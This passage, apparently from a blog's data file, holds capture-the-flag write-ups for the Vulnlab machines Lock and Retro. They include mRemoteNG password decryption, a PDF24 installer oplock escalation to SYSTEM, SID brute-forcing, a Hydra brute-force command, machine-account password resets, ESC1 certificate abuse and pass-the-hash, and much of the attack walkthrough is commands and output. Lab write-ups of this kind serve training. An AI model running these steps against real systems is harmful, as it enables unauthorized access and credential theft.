class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that this is an XML file containing the password information for the user <code>Gale.Dekarios</code>. This was the other user within <code>C:\\Users</code> aside from <code>ellen.freeman</code>.</p>\n<p>The file itself seems to be related to <code>mRemoteNG</code> and also having an affiliation with RDP. Assuming that we are able to crack the hash within this XML, we could login as this user.</p>\n<h1 id=\"Decrypting-mRemoteNG-Hashes\"><a href=\"#Decrypting-mRemoteNG-Hashes\" class=\"headerlink\" title=\"Decrypting mRemoteNG Hashes\"></a>Decrypting mRemoteNG Hashes</h1><p>I did a bit of research into mRemoteNG, and it seems to be an application that function relatively similarly to RDP. Our application at hand is a fork of mRemote, which is an open-source remote connection manager for Windows. This specific application supports protocols such as RDP, VNC, SSH, and may more. You can find documentation related to mRemoteNG <a href=\"https://mremoteng.readthedocs.io/en/v1.77.3-dev/\">here</a>.</p>\n<p>I also found a repository that contains a decryption script for mRemoteNG specifically. You can find that <a href=\"https://github.com/gquere/mRemoteNG_password_decrypt\">here</a>. Note that if it now prompting you to enter credentials when you clone the repository, that is due to the fact that a <code>.gitconfig</code> file was created in your home directory when we were exploiting Gitea earlier. You can delete this <code>.gitconfig</code> file to prevent it for prompting you for credentials.</p>\n<p>The script itself seems to be utilizing AES and PBKDF2_HMAC_SHA1 decryption in order to retrieve the plaintext password. The script uses the salt specified in <code>config.xml</code> and Base64 decoding in order to decrypt the password.</p>\n<p>Let’s download this config file containing the credentials to our machine and run the script against it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 mRemoteNG_password_decrypt/mremoteng_decrypt.py config.xml  </span><br><span class=\"line\">Name: RDP/Gale</span><br><span class=\"line\">Hostname: Lock</span><br><span class=\"line\">Username: Gale.Dekarios</span><br><span class=\"line\">Password: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though the password was decrypted successfully! We should be able to log in as <code>Gale.Dekarios</code> through RDP, given that mRemoteNG supports RDP as a protocol.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ xfreerdp /v:10.10.66.232 /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/lock-vl/h.png\"></p>\n<h1 id=\"Exploiting-PDF24\"><a href=\"#Exploiting-PDF24\" class=\"headerlink\" title=\"Exploiting PDF24\"></a>Exploiting PDF24</h1><p>The user flag is located within the user’s Desktop directory, as you can see from the landing page for RDP. Given that we have this user flag now, we’ll need to exploit something in order to gain elevated privileges to Administrator.</p>\n<p>Let’s check our privileges in order to determine whether or not we can exploit any misconfigured privileges for this user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\gale.dekarios&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                    State</span><br><span class=\"line\">============================= ============================== ========</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>\n\n<p>We don’t have any privileges aside from the default privileges that are given to regular users.</p>\n<p>One of the key thought processes I use for privilege escalation against Windows is understanding the three types of ways that privilege escalation can be obtained. This can be achieved either by <strong>exploiting misconfigured privileges</strong>, <strong>exploiting LDAP objects</strong>, and <strong>exploiting internal applications</strong>. Given that we don’t have any way to exploit the first two, let’s look around for any applications that are installed.</p>\n<p>Immediately on the home screen, you’ll notice that there’s an odd application installed called PDF24. The interesting part about this file is not in the application itself, but the fact that there is a hidden installation directory with the installer to this application on the machine.</p>\n<p><img src=\"/images/vulnlab/lock-vl/i.png\"></p>\n<p>Let’s do some research into this binary and see if there are any ways that we could potentially exploit it.</p>\n<p>Almost immediately, I found a local privilege escalation vulnerability to PDF24 through the installer that I had referred to before. You can find information about that <a href=\"https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level.\">here</a>.</p>\n<p>It seems as though the MSI installer of this application is vulnerable to a local privilege escalation vulnerability, which can only be achieved with GUI access. Given that we have RDP access, this presents itself as a valid attack path for us to receive SYSTEM. The exploit works when using the repair function with <code>msiexec.exe</code>, as a SYSTEM level command shell is utilized in order to suffice the installation process.</p>\n<p>During the installation, we can utilize a tool called <a href=\"https://github.com/googleprojectzero/symboliclink-testing-tools\">SetOpLock</a>. This is within the <code>symbolic-testing-tools</code> suite that seems to be a relatively normal application. This application could be vulnerable to AV, however it does not seem to be an issue in our case since AV is enabled.</p>\n<p>To explain as to what this binary will do, it will essentially create a breakpoint on the opcode where <code>PDF24-PrinterInstall.exe</code> is called. The reason for this is that a SYSTEM shell is spawned by the machine in order to install this specific portion, and if we are able to pause the shell at the moment it is called, we can exploit the shell to exploit commands for us. This should lead to us getting access to the shell with SYSTEM privileges.</p>\n<p>So with that, let’s compile the executable with Visual Studio and transfer it to our Kali machine, then finally to the RDP session. I did this locally, though if you are running WSL or any alternative with Windows you should be able to exploit this without needing to transfer this through SSH to your Kali machine. Make sure to build the <code>Release/x64</code> version of this binary so it works correctly.</p>\n<p>Let’s first run the installation as directed in the article.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\_install&gt; .\\SetOpLock.exe &quot;C:\\Program Files\\PDF24\\faxPrnInst.log&quot; r</span><br></pre></td></tr></table></figure>\n\n<p>After the installation process starts up, run the below command to execute the oplock hang. If it is working successfully, you should NOT receive an output.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\_install&gt; .\\SetOpLock.exe &quot;C:\\Program Files\\PDF24\\faxPrnInst.log&quot; r</span><br></pre></td></tr></table></figure>\n\n<p>During the end of this process, you’ll see a SYSTEM shell pop up. If this SYSTEM shell remains on the screen, that means the opcode lock worked correctly. However, if the SYSTEM shell pops up for a brief moment and goes away, then there was some form of error with the binary.</p>\n<p><img src=\"/images/vulnlab/lock-vl/j.png\"></p>\n<p>We now technically have a SYSTEM shell, though we don’t have any way to type anything. If we continue to follow the article, we can use Firefox to launch a SYSTEM shell based on the context of the frozen shell currently in front of us.</p>\n<p>First, right-click on the top bar of the command shell window. This should bring up a small details interface.</p>\n<p>Then, we’ll select properties to view the current properties of the shell.</p>\n<p>We’ll then select the the <code>legacy console mode</code> hyperlink towards the bottom of the properties pane. This should open up a Firefox session in the context of SYSTEM.</p>\n<p>Within Firefox, we can now press the hotkey <code>Ctrl + O</code> to open up the filesystem. Remember, we are still running this in the context of SYSTEM.</p>\n<p>Finally, type <code>cmd.exe</code> into the search bar, which should save <code>cmd.exe</code> locally and allow you to run it by clicking on it in the <code>Downloads pane</code>.</p>\n<p>If all was done correctly, you should have a shell as SYSTEM!</p>\n<p><img src=\"/images/vulnlab/lock-vl/k.png\"></p>\n<p>Now that we have access to this machine as SYSTEM, we essentially have control over the entirety of the machine and all of its files. We should be able to access the root flag in <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>. This means we have successfully compromised this machine!</p>\n<p><img src=\"/images/vulnlab/lock-vl/l.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was very entertaining, especially the PDF24 local privilege escalation portion. The fact that setting the opcode perfectly at the only point in time where a SYSTEM shell was executed made perfect sense logically. Furthermore, the start of the machine really tests your ability to prevent going down rabbit holes. This is a nice change of pace, and don’t forget to test EVERYTHING out and don’t hang on something for too long! Big thanks to xct and kozie for the development of this machine.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.speedguide.net/port.php?port=3000\">https://www.speedguide.net/port.php?port=3000</a><br><a href=\"https://docs.gitea.com/next/development/api-usage\">https://docs.gitea.com/next/development/api-usage</a><br><a href=\"https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom\">https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom</a><br><a href=\"https://mremoteng.readthedocs.io/en/v1.77.3-dev/\">https://mremoteng.readthedocs.io/en/v1.77.3-dev/</a><br><a href=\"https://github.com/gquere/mRemoteNG_password_decrypt\">https://github.com/gquere/mRemoteNG_password_decrypt</a><br><a href=\"https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level\">https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/#:~:text=The%20MSI%20installer%20of%20PDF24,the%20privileges%20to%20SYSTEM%20level</a>.<br><a href=\"https://github.com/googleprojectzero/symboliclink-testing-tools\">https://github.com/googleprojectzero/symboliclink-testing-tools</a></p>\n"},{"title":"Retro - Vulnlab","date":"2024-06-05T18:13:51.000Z","keywords":"Vulnlab, Easy, Windows","description":"This machine is another Active Directory machine, and mimics what you might see in an environment where interns and trainees are given a universal account to use in AD. This has it's own security issues, to which we'll exploit today.","cover":"/images/vulnlab/retro-vl/retro_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis machine is another Active Directory machine, and mimics what you might see in an environment where interns and trainees are given a universal account to use in AD. This has it's own security issues, to which we'll exploit today.\n\n# Enumeration\n\nLet's start with our usual NMAP scan.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 16:20 EDT\nNmap scan report for 10.10.124.140\nHost is up (0.11s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 18.56 seconds\n```\n\nAs explained earlier, we seem to have another AD machine similar to [Baby](http://dan-feliciano.com/writeups/baby). There is no external-facing webserver, so let's start with SMB and then followed by LDAP. We'll see if there's any way for us to authenticate with null credentials to the SMB server.\n\n```\n└─$ smbclient -L 10.10.124.140 -N\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Notes           Disk      \n        SYSVOL          Disk      Logon server share \n        Trainees        Disk      \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.124.140 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nAside from the regular shares such as `ADMIN$` or `NETLOGON`, we can see that there is a `Notes` and `Trainees` share, which are not usually here and were probably set up by an administrator. We'll run some more `smbclient` commands to authenticate to these shares to see if we can view the contents of them.\n\n```\n└─$ smbclient \\\\\\\\10.10.124.140\\\\trainees -N\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Sun Jul 23 17:58:43 2023\n  ..                                DHS        0  Wed Jul 26 05:54:14 2023\n  Important.txt                       A      288  Sun Jul 23 18:00:13 2023\n\n                6261499 blocks of size 4096. 2222845 blocks available\nsmb: \\> \n```\n\nYou'll notice an `Important.txt` file in the `trainees` share, which we can download with `smb: \\> get Important.txt`.\n\n```\n└─$ cat Important.txt                           \nDear Trainees,\n\nI know that some of you seemed to struggle with remembering strong and unique passwords.\nSo we decided to bundle every one of you up into one account.\nStop bothering us. Please. We have other stuff to do than resetting your password every day.\n\nRegards\n\nThe Admins\n```\n\nIt seems as though a trainee account has been given to all of the interns/trainees that are potentially being onboarded to the organization. The administrator proclaims that a universal username and password has been given to these users, which is something that we can try to retrieve from LDAP.\n\n# LDAP Foothold\n\nIf you didn't notice from earlier, we were able to authenticate to SMB with null credentials. You can also verify this by running `crackmapexec` against SMB, in which it should tell us that we have valid authentication as any user. I used the `Guest` user account with no password to replicate this.\n\n```\n└─$ crackmapexec smb 10.10.124.140 -u 'Guest' -p ''\nSMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.124.140   445    DC               [+] retro.vl\\Guest:\n```\n\nLet's see if we can do the same with LDAP. Reminder that you'll need to make sure that `dc.retro.vl` and `retro.vl` are bound to the IP address of the machine, you can find that information if you run an aggressive NMAP scan against the LDAP ports.\n\n```\n└─$ crackmapexec ldap 10.10.124.140 -u 'Guest' -p ''\nSMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.124.140   445    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090AC9, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c\nLDAP        10.10.124.140   389    DC               [+] retro.vl\\Guest:\n```\n\nDespite LDAP telling us that we'll need to perform a successful bind to LDAP, it still says that our credentials are valid.\n\nThis is great, because all we're looking for right now is the account username for the trainees. We can use `impacket-lookupsid`, which will brute force any domain SIDs that correspond to valid domain users within the AD instance. There's also an option if we want to specify for this utility to connect to SMB for it's scan, but we won't need to do that and can leave it blank.\n\n```\n└─$ impacket-lookupsid retro.vl/'Guest'@10.10.124.140 -domain-sids -no-pass\n\n[*] Brute forcing SIDs at 10.10.124.140\n[*] StringBinding ncacn_np:10.10.124.140[\\pipe\\lsarpc]\n[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172\n[...snip...]\n1104: RETRO\\trainee (SidTypeUser)\n1106: RETRO\\BANKING$ (SidTypeUser)\n1107: RETRO\\jburley (SidTypeUser)\n1108: RETRO\\HelpDesk (SidTypeGroup)\n1109: RETRO\\tblack (SidTypeUser)\n```\n\nYou'll see that it returned a few users, notably `BANKING$`(a machine account) and user accounts such as `jburley` and `tblack`. It also found a domain user named `trainee`, which we can assume is the universal trainee account that we're looking for.\n\n# Getting User Credentials\n\nNow based off of the text file we found in the SMB server, we know that the passwords were changed so that they are easy to remember. This means we could potentially brute force for them, which I've left an example command below as to what you'd need to brute force it with `Hydra`.\n\n```\n└─$ hydra -l 'trainee' -P /usr/share/wordlists/rockyou.txt ldap2://dc.retro.vl:389 -V\n```\n\nHowever you'll probably be sitting here for a while before `Hydra` returns with an empty string as the password (at least for SMB). Remember that this doesn't tell us anything, as we were allowed to authenticate successfully to both SMB and LDAP with null credentials despite them not being the correct way to authenticate.\n\nDoing some testing around you might find that you already are looking at the password. In our case, the administrator made the password very easy to remember, being the same string as the username `trainee:trainee`.\n\n```\n└─$ crackmapexec ldap dc.retro.vl -u 'trainee' -p 'trainee'\nSMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nLDAP        retro.vl        389    DC               [+] retro.vl\\trainee:trainee\n```\n\nSo with that, we now have credentials that we can use for the LDAP service, however first we can actually look at the `Notes` share that we couldn't go into before now that we have proper credentials. You'll find a text file in there named `ToDo.txt`.\n\n```\nThomas,\n\nafter convincing the finance department to get rid of their ancienct banking software\nit is finally time to clean up the mess they made. We should start with the pre created\ncomputer account. That one is older than me.\n\nBest\n\nJames\n```\n\nThese users both correspond to `tblack` and `jburley`, and the pre-created computer account they are referring to is the `BANKING$` machine account we saw in our `lookupsid` command output.\n\nSo from here we don't really have many leads except for one - we have some user accounts that we need to get access to as well proper user credentials to the `trainee` account. Let's see if we can find anything in [Bloodhound](https://github.com/dirkjanm/BloodHound.py).\n\n```\n└─$ bloodhound-python -d 'retro.vl' -u 'trainee' -p 'trainee' -c all -ns 10.10.124.140 --zip --use-ldaps\n```\n\nThough you'll notice that our `trainee` user does not seem to have control over any objects that could lead us to compromise another account.\n\n# Pre-Installed Machine Accounts\n\nYou'll notice on the Wiki though that there is a hint to pre-created computer accounts article that can be found [here](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts). This essentially explains that machine accounts that have the `Assign this computer account as a pre-Windows 2000 computer` option enabled on their account, then they'll have the same password as their regular username (excluding the `$`). This is only the case if the administrator did not opt to assigning the account a random password.\n\n```\nThe **Assign this computer account as a pre-Windows 2000 computer** check box assigns a password that is based on the new computer name. If you do not select this check box, you are assigned a random password.\n```\n\nWe can verify that we are correct about our theory by running a `crackmapexec` check with creds to the same credentials.\n\n```\n┌──(daz㉿kali)-[~/tech/vl/retro/dump]\n└─$ crackmapexec smb 10.10.124.140 -u 'banking$' -p 'banking'\nSMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.124.140   445    DC               [-] retro.vl\\banking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT\n```\n\nYou'll notice that we'll receive an error that is not a regular authentication error, and instead is `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`. This does not mean the credentials are incorrect, and instead means that the domain does not trust this machine account.\n\nDespite that, we technically have a credentials though they aren't actually valid. I found that our next avenue to exploitation is ADCS, but if we try to run any queries to ADCS we'll come back with an invalid credential error.\n\nSo the big thing here is that we'll need to reset this machine accounts password using `Impacket` to obtain credentials that we can actually use. There's a tool called `impacket-changepasswd` that does the trick with us - we'll just need to use the trainee creds that we have access to.\n\n```\n└─$ impacket-changepasswd retro.vl/banking$:banking@10.10.124.140 -dc-ip 10.10.124.140 -altuser \"trainee\" -altpass \"trainee\" -newpass daz\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[!] Attempting to *change* the password of retro.vl/banking$ as retro.vl/trainee. You may want to use '-reset' to *reset* the password of the target.\n[*] Changing the password of retro.vl\\banking$\n[*] Connecting to DCE/RPC as retro.vl\\trainee\n[*] Password was changed successfully.\n```\n\nWe can see that the password was changed successfully, and we'll run another `crackmapexec` command to see if anything has changed.\n\n```\n└─$ crackmapexec smb 10.10.124.140 -u 'banking$' -p 'daz' \nSMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.124.140   445    DC               [+] retro.vl\\banking$:daz\n```\n\nLooks like the password change method worked out, we can now progress to ADCS.\n\n# ESC1 ADCS Exploitation\n\nI've covered ADCS in my [Hybrid](https://dan-feliciano.com/writeups/hybrid/) writeup previously, and given that we have credentials we can potentially look for any certificates that we can abuse. ADCS is essentially a server role that allows administrators to integrate PKI (Public Key Infrastructure) into their AD environment for digital signature/certificate capabilities. They then allow these same certificates to be used to authenticate and access domain resources on behalf of a user. In our case, we can request a certificate for the `Administrator` machine account on behalf of the `BANKING$` user.\n\nThe tool to abuse this is [Certipy](https://github.com/ly4k/Certipy) (on Linux), if we were on a Windows machine we'd use [Certify](https://github.com/GhostPack/Certify).\n\n```\n└─$ certipy-ad find -username 'banking$'@retro.vl -password 'daz' -dc-ip 10.10.124.140 -vulnerable -enabled\n```\n\nIt will save the responding certificates that we are able to exploit into a file after the command has finished. (I took a break at this point, so the IP address will change)\n\n```\n    Template Name                       : RetroClients\n    Display Name                        : Retro Clients\n    Certificate Authorities             : retro-DC-CA\n    Enabled                             : True\n    Client Authentication               : True\n[...snip...]\n    [!] Vulnerabilities\n      ESC1                              : 'RETRO.VL\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication\n```\n\nThe certificate tells us that all domain computers can enroll in this template and that it requires client authentication. Given that we have a domain computer account `banking$`, all that's required is to request this certificate on behalf of another user. Since we are allowed to request this on behalf of any user, let's do this for the Administrator user.\n\nNote that you will need to adjust the `-key-size` option to a value higher than `4096` to prevent a NetBIOS error.\n\n```\n└─$ certipy-ad req -u 'banking$'@retro.vl -p 'daz' -dc-ip 10.10.111.59 -target DC.retro.vl -ca retro-DC-CA -template RetroClients -upn Administrator@retro.vl -key-size 4096\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 9\n[*] Got certificate with UPN 'Administrator@retro.vl'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n```\n\nThis `.pfx` file is a joined file that includes the certificate along with the private key for this user. We can use this `.pfx` file to authenticate and retrieve the Administrator user's NTLM hash.\n\n```\n└─$ certipy-ad auth -dc-ip 10.10.111.59 -domain 'retro.vl' -username Administrator -pfx administrator.pfx\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@retro.vl\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:[...snip...]\n```\n\nThis has returned the NTLM hash for the Administrator user, now all that is left is to pass the hash and authenticate to the machine as them! Note that we can't use WinRM as I believe it isn't on the machine (at least I was running into issues on my end during the time of this writeup). We can use `smbexec` as a substitute to launch a shell.\n\n```\n└─$ impacket-smbexec -shell-type powershell -dc-ip 10.10.111.59 -hashes :[...snip...] retro.vl/Administrator@10.10.111.59\n```\n\nNote that the shell is relatively slow, but if you cat out the directory of the root flag you should be able to retrieve it after a few seconds. An alternative to this is to use `impacket-smbclient`, it's up to you.\n\n![](/images/vulnlab/retro-vl/b.jpg)\n\nThis means we have successfully rooted the machine!\n\n# Conclusion\n\nThis box is also very useful for AD basics and understanding what you have access to. Credential usage is also something that you can test in red-teaming scenarios, though the success-rate may be very slim. Nonetheless when it does work, it can result in something similar to the above. Big thanks to r0BIT for the development of this machine - it helped a lot with practice!\n\n# Resources\n\nhttps://dan-feliciano.com/writeups/baby\nhttps://github.com/dirkjanm/BloodHound.py\nhttps://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts\nhttps://dan-feliciano.com/writeups/hybrid/\nhttps://github.com/ly4k/Certipy\nhttps://github.com/GhostPack/Certify","source":"_posts/retro.md","raw":"---\ntitle: Retro - Vulnlab\ndate: 2024-06-05 14:13:51\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Windows'\ndescription: This machine is another Active Directory machine, and mimics what you might see in an environment where interns and trainees are given a universal account to use in AD. This has it's own security issues, to which we'll exploit today.\ncover: /images/vulnlab/retro-vl/retro_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis machine is another Active Directory machine, and mimics what you might see in an environment where interns and trainees are given a universal account to use in AD. This has it's own security issues, to which we'll exploit today.\n\n# Enumeration\n\nLet's start with our usual NMAP scan.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 16:20 EDT\nNmap scan report for 10.10.124.140\nHost is up (0.11s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 18.56 seconds\n```\n\nAs explained earlier, we seem to have another AD machine similar to [Baby](http://dan-feliciano.com/writeups/baby). There is no external-facing webserver, so let's start with SMB and then followed by LDAP. We'll see if there's any way for us to authenticate with null credentials to the SMB server.\n\n```\n└─$ smbclient -L 10.10.124.140 -N\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Notes           Disk      \n        SYSVOL          Disk      Logon server share \n        Trainees        Disk      \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.124.140 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nAside from the regular shares such as `ADMIN$` or `NETLOGON`, we can see that there is a `Notes` and `Trainees` share, which are not usually here and were probably set up by an administrator. We'll run some more `smbclient` commands to authenticate to these shares to see if we can view the contents of them.\n\n```\n└─$ smbclient \\\\\\\\10.10.124.140\\\\trainees -N\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Sun Jul 23 17:58:43 2023\n  ..                                DHS        0  Wed Jul 26 05:54:14 2023\n  Important.txt                       A      288  Sun Jul 23 18:00:13 2023\n\n                6261499 blocks of size 4096. 2222845 blocks available\nsmb: \\> \n```\n\nYou'll notice an `Important.txt` file in the `trainees` share, which we can download with `smb: \\> get Important.txt`.\n\n```\n└─$ cat Important.txt                           \nDear Trainees,\n\nI know that some of you seemed to struggle with remembering strong and unique passwords.\nSo we decided to bundle every one of you up into one account.\nStop bothering us. Please. We have other stuff to do than resetting your password every day.\n\nRegards\n\nThe Admins\n```\n\nIt seems as though a trainee account has been given to all of the interns/trainees that are potentially being onboarded to the organization. The administrator proclaims that a universal username and password has been given to these users, which is something that we can try to retrieve from LDAP.\n\n# LDAP Foothold\n\nIf you didn't notice from earlier, we were able to authenticate to SMB with null credentials. You can also verify this by running `crackmapexec` against SMB, in which it should tell us that we have valid authentication as any user. I used the `Guest` user account with no password to replicate this.\n\n```\n└─$ crackmapexec smb 10.10.124.140 -u 'Guest' -p ''\nSMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nSMB         10.10.124.140   445    DC               [+] retro.vl\\Guest:\n```\n\nLet's see if we can do the same with LDAP. Reminder that you'll need to make sure that `dc.retro.vl` and `retro.vl` are bound to the IP address of the machine, you can find that information if you run an aggressive NMAP scan against the LDAP ports.\n\n```\n└─$ crackmapexec ldap 10.10.124.140 -u 'Guest' -p ''\nSMB         10.10.124.140   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.124.140   445    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090AC9, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c\nLDAP        10.10.124.140   389    DC               [+] retro.vl\\Guest:\n```\n\nDespite LDAP telling us that we'll need to perform a successful bind to LDAP, it still says that our credentials are valid.\n\nThis is great, because all we're looking for right now is the account username for the trainees. We can use `impacket-lookupsid`, which will brute force any domain SIDs that correspond to valid domain users within the AD instance. There's also an option if we want to specify for this utility to connect to SMB for it's scan, but we won't need to do that and can leave it blank.\n\n```\n└─$ impacket-lookupsid retro.vl/'Guest'@10.10.124.140 -domain-sids -no-pass\n\n[*] Brute forcing SIDs at 10.10.124.140\n[*] StringBinding ncacn_np:10.10.124.140[\\pipe\\lsarpc]\n[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172\n[...snip...]\n1104: RETRO\\trainee (SidTypeUser)\n1106: RETRO\\BANKING$ (SidTypeUser)\n1107: RETRO\\jburley (SidTypeUser)\n1108: RETRO\\HelpDesk (SidTypeGroup)\n1109: RETRO\\tblack (SidTypeUser)\n```\n\nYou'll see that it returned a few users, notably `BANKING$`(a machine account) and user accounts such as `jburley` and `tblack`. It also found a domain user named `trainee`, which we can assume is the universal trainee account that we're looking for.\n\n# Getting User Credentials\n\nNow based off of the text file we found in the SMB server, we know that the passwords were changed so that they are easy to remember. This means we could potentially brute force for them, which I've left an example command below as to what you'd need to brute force it with `Hydra`.\n\n```\n└─$ hydra -l 'trainee' -P /usr/share/wordlists/rockyou.txt ldap2://dc.retro.vl:389 -V\n```\n\nHowever you'll probably be sitting here for a while before `Hydra` returns with an empty string as the password (at least for SMB). Remember that this doesn't tell us anything, as we were allowed to authenticate successfully to both SMB and LDAP with null credentials despite them not being the correct way to authenticate.\n\nDoing some testing around you might find that you already are looking at the password. In our case, the administrator made the password very easy to remember, being the same string as the username `trainee:trainee`.\n\n```\n└─$ crackmapexec ldap dc.retro.vl -u 'trainee' -p 'trainee'\nSMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)\nLDAP        retro.vl        389    DC               [+] retro.vl\\trainee:trainee\n```\n\nSo with that, we now have credentials that we can use for the LDAP service, however first we can actually look at the `Notes` share that we couldn't go into before now that we have proper credentials. You'll find a text file in there named `ToDo.txt`.\n\n```\nThomas,\n\nafter convincing the finance department to get rid of their ancienct banking software\nit is finally time to clean up the mess they made. We should start with the pre created\ncomputer account. That one is older than me.\n\nBest\n\nJames\n```\n\nThese users both correspond to `tblack` and `jburley`, and the pre-created computer account they are referring to is the `BANKING$` machine account we saw in our `lookupsid` command output.\n\nSo from here we don't really have many leads except for one - we have some user accounts that we need to get access to as well proper user credentials to the `trainee` account. Let's see if we can find anything in [Bloodhound](https://github.com/dirkjanm/BloodHound.py).\n\n```\n└─$ bloodhound-python -d 'retro.vl' -u 'trainee' -p 'trainee' -c all -ns 10.10.124.140 --zip --use-ldaps\n```\n\nThough you'll notice that our `trainee` user does not seem to have control over any objects that could lead us to compromise another account.\n\n# Pre-Installed Machine Accounts\n\nYou'll notice on the 